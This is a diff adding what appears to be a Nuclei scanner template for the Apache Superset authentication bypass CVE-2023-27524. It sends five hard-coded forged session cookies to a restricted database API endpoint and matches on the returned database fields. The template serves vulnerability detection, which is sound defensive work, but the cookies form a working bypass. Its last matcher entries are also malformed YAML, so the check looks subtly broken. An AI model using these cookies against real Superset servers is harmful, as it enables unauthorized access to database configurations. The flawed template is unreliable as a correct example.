@@ -1,0 +1,53 @@
+id: apache-superset-authentication-bypass
+
+info:
+  name: Apache Superset Authentication Bypass (CVE-2023-27524)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: authentication,bypass,CVE-2023-27524
+  description: |
+    This template checks for an authentication bypass vulnerability in Apache Superset by attempting to use known session tokens to access restricted API endpoints.
+
+variables:
+  sessions:
+    - eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKFnng.XPeCvkBiP7rOv1PhgKZ8xkzi2jk
+    - eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKFu3g.k_WNoBY1ouhQyOXa5UcYdjVVuq0
+    - eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKG_fg.KalpJbMq1SZPCBuunG9-ycDX9HM
+    - eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKG_zQ.FPiBfT39gn2slf--XZHsk0rByEY
+    - eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKHAPQ.zRjwotMHJES3eW8fJH8F_5GlD-U
+
+http:
+  - id: check-login-page
+    method: GET
+    path:
+      - "{{BaseURL}}/login/"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Apache Superset"
+
+  - id: check-authentication-bypass
+    method: GET
+    path:
+      - "{{BaseURL}}/api/v1/database/1"
+    headers:
+      Cookie: session={{sessions}}
+    payloads:
+      sessions:
+        - eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKFnng.XPeCvkBiP7rOv1PhgKZ8xkzi2jk
+        - eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKFu3g.k_WNoBY1ouhQyOXa5UcYdjVVuq0
+        - eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKG_fg.KalpJbMq1SZPCBuunG9-ycDX9HM
+        - eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKG_zQ.FPiBfT39gn2slf--XZHsk0rByEY
+        - eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKHAPQ.zRjwotMHJES3eW8fJH8F_5GlD-U
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "configuration_method":
+          - "database_name":
